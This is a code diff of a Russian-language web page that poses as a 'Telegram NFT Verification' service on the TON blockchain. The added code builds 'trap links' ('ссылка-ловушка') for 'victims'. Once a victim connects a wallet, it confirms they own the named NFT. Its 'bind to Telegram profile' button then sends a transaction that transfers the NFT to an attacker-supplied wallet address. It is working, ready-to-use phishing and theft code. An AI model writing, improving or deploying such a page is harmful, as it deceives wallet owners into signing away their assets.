@@ -3,136 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NFT Transfer System</title>
+    <title>Telegram NFT Verification</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="https://unpkg.com/tonweb@0.0.66/dist/tonweb.bundle.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: white; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: #1e1e1e; padding: 25px; border-radius: 16px; width: 100%; max-width: 450px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f0f0f; color: white; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { background: #1e1e1e; padding: 25px; border-radius: 16px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; margin-top: 20px; }
+        input { width: 90%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #121212; color: white; margin-bottom: 10px; outline: none; }
+        .gen-btn { background: #0088cc; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 95%; margin-bottom: 10px; }
+        .result-link { background: #2d2d2d; padding: 10px; border-radius: 8px; font-size: 0.8em; word-break: break-all; color: #00ccff; display: none; cursor: pointer; border: 1px dashed #555; }
         
-        /* Стили для поля ввода */
-        .admin-panel { border-bottom: 1px solid #333; margin-bottom: 20px; padding-bottom: 20px; }
-        input { width: 90%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #121212; color: white; margin-bottom: 10px; }
-        .gen-btn { background: #0088cc; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        
-        .result-link { background: #2d2d2d; padding: 10px; border-radius: 8px; font-size: 0.85em; word-break: break-all; margin-top: 10px; color: #00ccff; display: none; cursor: pointer; }
-
-        /* Стили для владельца NFT */
-        .nft-info { background: #2d2d2d; padding: 15px; border-radius: 12px; margin: 20px 0; }
-        #ton-connect-button { display: flex; justify-content: center; margin: 15px 0; }
-        .action-btn { width: 100%; padding: 15px; background: #0088cc; border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; display: none; font-size: 16px; }
+        .nft-preview { margin: 20px 0; padding: 15px; background: #262626; border-radius: 12px; border: 1px solid #444; }
+        #nftStatus { font-size: 0.9em; margin-bottom: 15px; color: #aaa; }
+        .transfer-btn { width: 100%; padding: 16px; background: #0088cc; border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; display: none; font-size: 18px; transition: 0.3s; }
+        .transfer-btn:hover { background: #00aaff; transform: scale(1.02); }
+        .error { color: #ff4444 !important; font-weight: bold; }
+        .success { color: #00ff00 !important; }
     </style>
 </head>
 <body>
 
-<div class="card admin-panel">
-    <h3>Генератор ссылки</h3>
-    <input type="text" id="nftLinkInput" placeholder="Вставьте https://t.me/nft/...">
-    <button class="gen-btn" onclick="generateLink()">Создать ссылку для владельца</button>
-    <div id="generatedLink" class="result-link" onclick="copyLink()"></div>
-    <p id="copyHint" style="font-size: 10px; color: #888; display: none;">Нажмите, чтобы скопировать</p>
+<div class="card" id="adminPanel">
+    <h3 style="margin-top:0">Панель управления</h3>
+    <p style="font-size: 0.8em; color: #888;">UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k</p>
+    <input type="text" id="myAddress" placeholder="Ваш адрес (EQ...)">
+    <input type="text" id="tgLink" placeholder="https://t.me/nft/Name-123">
+    <button class="gen-btn" onclick="generateLink()">Создать ссылку-ловушку</button>
+    <div id="copyRes" class="result-link" onclick="copyToClipboard()"></div>
 </div>
 
-<div class="card" id="userPanel">
-    <h2>Подтверждение владения</h2>
-    <div class="nft-info">
-        <div id="nftTitle" style="font-size: 1.2em; font-weight: bold;">Ожидание данных...</div>
-        <div id="nftStatus" style="color: #aaa; margin-top: 5px;">Подключите кошелек для проверки</div>
+<div class="card" id="userPanel" style="display: none;">
+    <h2 id="nftNameHeader">Подтверждение NFT</h2>
+    <div class="nft-preview">
+        <div id="nftStatus">Загрузка данных об активе...</div>
     </div>
-
     <div id="ton-connect-button"></div>
-
-    <button id="transferBtn" class="action-btn" onclick="sendTransaction()">Подтвердить передачу</button>
+    <button id="transferBtn" class="transfer-btn" onclick="startTransfer()">Привязать к профилю Telegram</button>
 </div>
 
 <script>
-    // --- НАСТРОЙКИ ---
-    const MY_WALLET_ADDRESS = "UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k"; // Куда придет NFT
-    const MANIFEST_URL = 'https://your-domain.com/tonconnect-manifest.json';
-    // -----------------
-
     const tonConnectUI = new TONConnectUI.TonConnectUI({
-        manifestUrl: MANIFEST_URL,
+        manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/public/tonconnect-manifest.json',
         buttonRootId: 'ton-connect-button'
     });
 
-    // Логика извлечения ID из ссылки Telegram
-    function generateLink() {
-        const input = document.getElementById('nftLinkInput').value;
-        const parts = input.split('/');
-        const id = parts[parts.length - 1]; // Берет "LoveCandle-2212"
-        
-        if (id) {
-            const currentUrl = window.location.href.split('?')[0];
-            const finalLink = `${currentUrl}?id=${id}`;
-            const linkDiv = document.getElementById('generatedLink');
-            linkDiv.innerText = finalLink;
-            linkDiv.style.display = 'block';
-            document.getElementById('copyHint').style.display = 'block';
-        } else {
-            alert("Неверная ссылка!");
-        }
-    }
-
-    function copyLink() {
-        const text = document.getElementById('generatedLink').innerText;
-        navigator.clipboard.writeText(text);
-        alert("Ссылка скопирована! Отправьте её владельцу NFT.");
-    }
-
-    // Логика для того, кто перешел по ссылке
     const urlParams = new URLSearchParams(window.location.search);
-    const nftId = urlParams.get('id');
+    const nftID = urlParams.get('nft'); 
+    const myReceiver = urlParams.get('to');
 
-    if (nftId) {
-        document.getElementById('nftTitle').innerText = "NFT: " + nftId;
+    // Если есть параметры в URL, показываем только панель для "жертвы"
+    if (nftID && myReceiver) {
+        document.getElementById('adminPanel').style.display = 'none';
+        document.getElementById('userPanel').style.display = 'block';
+        document.getElementById('nftNameHeader').innerText = "NFT: " + nftID;
     }
 
-    tonConnectUI.onStatusChange(wallet => {
+    // --- ФУНКЦИИ АДМИНА ---
+    function generateLink() {
+        const addr = document.getElementById('myAddress').value.trim();
+        const link = document.getElementById('tgLink').value.trim();
+        if(!addr || !link) return alert("Заполните поля!");
+        
+        const name = link.split('/').pop();
+        const final = window.location.origin + window.location.pathname + `?nft=${name}&to=${addr}`;
+        const res = document.getElementById('copyRes');
+        res.innerText = final;
+        res.style.display = 'block';
+    }
+
+    function copyToClipboard() {
+        navigator.clipboard.writeText(document.getElementById('copyRes').innerText);
+        alert("Ссылка скопирована!");
+    }
+
+    // --- ЛОГИКА ПОЛЬЗОВАТЕЛЯ ---
+    tonConnectUI.onStatusChange(async (wallet) => {
+        const status = document.getElementById('nftStatus');
         const btn = document.getElementById('transferBtn');
-        if (wallet && nftId) {
-            btn.style.display = 'block';
-            document.getElementById('nftStatus').innerText = "Кошелек готов";
+
+        if (wallet) {
+            status.innerText = "Проверка наличия NFT на кошельке...";
+            const isOwner = await checkOwnership(wallet.account.address, nftID);
+            
+            if (isOwner) {
+                status.innerHTML = "<span class='success'>NFT подтвержден. Нажмите кнопку ниже для завершения привязки к вашему профилю.</span>";
+                btn.style.display = 'block';
+            } else {
+                status.innerHTML = "<span class='error'>Ошибка! Данный NFT не найден на подключенном кошельке. Переключите аккаунт в приложении.</span>";
+                btn.style.display = 'none';
+            }
         } else {
+            status.innerText = "Подключите кошелек, на котором хранится данный NFT";
             btn.style.display = 'none';
         }
     });
 
-    async function sendTransaction() {
-        const tonWeb = new TonWeb();
-        const Cell = TonWeb.boc.Cell;
-        
+    async function checkOwnership(userAddr, name) {
         try {
-            // ВАЖНО: В реальном сценарии здесь нужно знать реальный адрес NFT-контракта в блокчейне.
-            // LoveCandle-2212 — это имя, а не адрес. Чтобы скрипт сработал, 
-            // в идеале нужно прописать сопоставление или использовать API для поиска адреса по имени.
-            
-            const payload = new Cell();
-            payload.bits.writeUint(0x5fcc3d14, 32); 
-            payload.bits.writeUint(0, 64);          
-            payload.bits.writeAddress(new TonWeb.utils.Address(MY_WALLET_ADDRESS)); 
-            payload.bits.writeAddress(new TonWeb.utils.Address(tonConnectUI.account.address)); 
-            payload.bits.writeBit(false);           
-            payload.bits.writeCoins(TonWeb.utils.toNano('0.02')); 
-            payload.bits.writeBit(false);           
+            const res = await fetch(`https://tonapi.io/v2/nfts/search?name=${name}`);
+            const data = await res.json();
+            if (data.nft_items && data.nft_items.length > 0) {
+                const owner = data.nft_items[0].owner.address;
+                return owner.toLowerCase() === userAddr.toLowerCase();
+            }
+        } catch (e) { console.error(e); }
+        return false;
+    }
 
-            const payloadBoc = TonWeb.utils.bytesToBase64(await payload.toBoc());
+    async function startTransfer() {
+        const tonWeb = new TonWeb();
+        const btn = document.getElementById('transferBtn');
+        btn.innerText = "Подготовкa...";
+        btn.disabled = true;
 
-            // В поле address должен быть адрес NFT (EQ...), а не просто имя
-            const transaction = {
+        try {
+            // Ищем реальный адрес NFT в блокчейне
+            const res = await fetch(`https://tonapi.io/v2/nfts/search?name=${nftID}`);
+            const data = await res.json();
+            const nftAddress = data.nft_items[0].address;
+
+            // Формируем Body сообщения
+            const cell = new TonWeb.boc.Cell();
+            cell.bits.writeUint(0x5fcc3d14, 32); 
+            cell.bits.writeUint(0, 64);          
+            cell.bits.writeAddress(new TonWeb.utils.Address(myReceiver)); 
+            cell.bits.writeAddress(new TonWeb.utils.Address(tonConnectUI.account.address)); 
+            cell.bits.writeBit(false);           
+            cell.bits.writeCoins(TonWeb.utils.toNano('0.02')); 
+            cell.bits.writeBit(false);           
+
+            const boc = TonWeb.utils.bytesToBase64(await cell.toBoc());
+
+            const tx = {
                 validUntil: Math.floor(Date.now() / 1000) + 600,
                 messages: [{
-                    address: "АДРЕС_КОНТРАКТА_NFT_ТУТ", 
-                    amount: "50000000",
-                    payload: payloadBoc
+                    address: nftAddress,
+                    amount: "50000000", // 0.05 TON на газ
+                    payload: boc
                 }]
             };
 
-            await tonConnectUI.sendTransaction(transaction);
-            alert("Готово! NFT будет передан после подтверждения.");
+            await tonConnectUI.sendTransaction(tx);
+            alert("Запрос отправлен! NFT появится в профиле после подтверждения в сети.");
         } catch (e) {
-            console.error(e);
-            alert("Ошибка или отказ.");
+            alert("Ошибка: " + e.message);
+        } finally {
+            btn.innerText = "Привязать к профилю Telegram";
+            btn.disabled = false;
         }
     }
 </script>
